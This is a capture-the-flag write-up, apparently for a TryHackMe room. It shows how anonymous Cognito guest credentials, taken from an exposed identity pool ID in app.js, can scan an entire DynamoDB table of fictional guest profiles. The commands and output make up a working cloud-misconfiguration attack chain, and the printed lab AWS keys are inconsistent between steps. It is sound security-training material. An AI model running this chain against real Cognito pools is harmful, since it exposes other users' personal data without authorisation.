**Tags:** Cloud, AWS, Cognito, IAM Misconfiguration.

**Difficulty:** Easy.

```text
http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/
```

## 1. Reconnaissance

We begin by identifying open ports and running services using Nmap:

```bash
sudo nmap -sS -sV complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
```

Output:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-03 05:41 EDT
Nmap scan report for complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com (52.216.24.51)
Host is up (0.015s latency).
Other addresses for complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com (not scanned): 16.15.254.204 16.15.255.205 16.15.223.3 16.15.207.136 16.15.229.232 52.216.53.21 54.231.160.189 64:ff9b::100f:e5e8 64:ff9b::34d8:1833 64:ff9b::100f:df03 64:ff9b::34d8:3515 64:ff9b::36e7:a0bd 64:ff9b::100f:ffcd 64:ff9b::100f:cf88 64:ff9b::100f:fecc
rDNS record for 52.216.24.51: s3-website-us-east-1.amazonaws.com
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE    VERSION
80/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds
```

The results show that the web application is hosted on AWS S3. HTTP is available on `80/tcp`, and the hostname indicates an S3 Website Endpoint in the `us-east-1` region.

---

## 2. Analyzing the JavaScript Application

After inspecting the page source, we discover the `app.js` file.

The JavaScript contains AWS configuration parameters:

```javascript
const IDENTITY_POOL_ID = "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688";
const AWS_REGION = "us-east-1";
const TABLE_NAME = "complimentary-GuestWellnessProfiles";
```

This is an important finding: the application uses an **Amazon Cognito Identity Pool** to obtain AWS credentials and then interacts with the DynamoDB table `complimentary-GuestWellnessProfiles`.

The following information can therefore be obtained from the client-side JavaScript:

* Cognito Identity Pool:
  `us-east-1:836c0949-292d-485b-b532-52d5ca7bb688`
* AWS Region:
  `us-east-1`
* DynamoDB table:
  `complimentary-GuestWellnessProfiles`

---

## 3. Directory Enumeration

We check the web server using Gobuster:

```bash
gobuster dir -u complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com -w ~/HH101/seclists/Discovery/Web-Content/big.txt -t2 --timeout 30s
```

Scan configuration:

```text
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com
[+] Method:                  GET
[+] Threads:                 2
[+] Wordlist:                /home/deb88/HH101/seclists/Discovery/Web-Content/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 30s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
```

During the scan, DNS/network timeouts occur:

```text
Progress: 11400 / 20482 (55.66%)[ERROR] Get "http://complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com/maquettes": dial tcp: lookup complimentary-wellness-app-332173347248.s3-website-us-east-1.amazonaws.com on 10.0.2.3:53: read udp 10.0.2.15:59189->10.0.2.3:53: i/o timeout
```

We also discover:

```text
/soap                 (Status: 200) [Size: 0
```

However, `/soap` does not respond to requests in the browser.

Therefore, the more interesting finding is not the discovered directory, but the AWS configuration data previously found in `app.js`.

---

# 4. Obtaining a Cognito Identity with aws-cli

With the `IDENTITY_POOL_ID`, we contact Amazon Cognito and request an Identity ID:

```bash
aws cognito-identity get-id \
  --region us-east-1 \
  --identity-pool-id "us-east-1:836c0949-292d-485b-b532-52d5ca7bb688"
```

Response:

```json
{
    "IdentityId": "us-east-1:4d571309-b08d-c56a-c543-30e257953228"
}
```

At this stage, Cognito provides an identifier for a temporary identity:

```text
us-east-1:4d571309-b08d-c56a-c543-30e257953228
```

The application therefore uses a Cognito Identity Pool through which an anonymous/guest user can potentially obtain temporary AWS credentials.

---

# 5. Obtaining Temporary AWS Credentials

Next, we request temporary credentials for the Cognito Identity:

```bash
aws cognito-identity get-credentials-for-identity \
  --region us-east-1 \
  --identity-id "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13"
```

AWS returns:

```json
{
    "IdentityId": "us-east-1:4d571309-b007-c7f4-3b37-4d939ba55c13",
    "Credentials": {
        "AccessKeyId": "ASIAU2VYTBGYCFTPQKUC",
        "SecretKey": "XglN9y9H6oL0LBEVehV6fat5HVUhip/4Fdljeo/E",
        "SessionToken": "...",
        "Expiration": "2026-08-03T07:51:01-04:00"
    }
}
```

The full AWS output also contained a large `SessionToken`.

The obtained credentials are **temporary AWS credentials** that allow AWS actions to be performed on behalf of the Cognito Identity to which they were issued.

Their validity is limited:

```text
Expiration: 2026-08-03T07:51:01-04:00
```

---

# 6. Exporting AWS Credentials

To make the AWS CLI automatically use the obtained temporary credentials, we export them as environment variables:

```bash
export AWS_ACCESS_KEY_ID="ASIAU2VYTBGYKP67ULN3"
export AWS_SECRET_ACCESS_KEY="s20bKrmdV3va1tC8TQUoJ1lrc11yqAXRmXwkzqMi"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjELv..."
export AWS_DEFAULT_REGION="us-east-1"
```

After this, the AWS CLI uses these values for subsequent requests.

We also set the default AWS region:

```text
AWS_DEFAULT_REGION=us-east-1
```

---

# 7. Checking the AWS Identity

After setting the credentials, we check which AWS identity is being used:

```bash
aws sts get-caller-identity
```

This command is used to verify the current AWS context and confirm that the temporary credentials are working.

The output of this command is not included in the log.

---

# 8. Accessing DynamoDB

Earlier, we discovered the table name in `app.js`:

```text
complimentary-GuestWellnessProfiles
```

We can now use the obtained AWS credentials to access DynamoDB:

```bash
aws dynamodb scan --table-name complimentary-GuestWellnessProfiles
```

The `scan` request retrieves records from the DynamoDB table.

As a result, user profiles are discovered.

---

# 9. First Profile

The table contains the following profile:

```text
password: digitaldetox2026
location: 25.2055,55.2733
notes: Booked the quiet room for his "digital detox." Checked email twice since writing that.
guest_id: guest-vibe
email: vibe@hackerholidays.thm
phone: +1-555-0193
name: Vibe (Move Fast & Break Things)
```

The guest AWS identity therefore has the ability to read data from the user profile table.

---

# 10. Second Profile

The next record contains:

```text
password: sunkissed88
location: 25.2048,55.2708
notes: Posted 47 times in three days. Wants everything tagged #ByteLotus for the algorithm.
guest_id: guest-lambo
email: lambo@hackerholidays.thm
phone: +1-555-0142
name: Lambo (@0xMia)
```

This confirms that access is not limited to the guest's own profile and extends to other records in the table.

---

# 11. Finding the Flag

The next record contains the most important information:

```text
password: escalation_only
location: 25.2048,55.2708
notes: If you're reading this, the wellness app's guest role can read every profile, not just its own. THM{fr33_app_fr33_d4t4!}
guest_id: guest-vip-042
email: vip042@hackerholidays.thm
phone: +1-555-0100
name: Guest VIP-042
```

The `notes` field explicitly states that the wellness application's guest role can read **all profiles**, rather than only its own.

The flag is also found in the same field:

```text
THM{fr33_app_fr33_d4t4!}
```

## What Happened

The attack chain can be summarized as follows:

1. Nmap showed that the application was hosted on AWS S3.
2. The `app.js` file exposed the `IDENTITY_POOL_ID`, AWS region, and DynamoDB table name.
3. `aws cognito-identity get-id` was used to obtain a Cognito Identity ID.
4. `get-credentials-for-identity` was used to obtain temporary AWS credentials.
5. The credentials were exported as environment variables.
6. `aws sts get-caller-identity` was used to verify the current AWS identity.
7. The obtained permissions allowed a DynamoDB `Scan`.
8. The `Scan` returned the contents of the `complimentary-GuestWellnessProfiles` table, including other users' profiles.
9. The flag was found in the `notes` field of one of the profiles:

```text
THM{fr33_app_fr33_d4t4!}
```

The main issue in the room is **excessive permissions assigned to the guest Cognito identity**, allowing it to read all DynamoDB profiles instead of restricting access to the data belonging to the individual user.
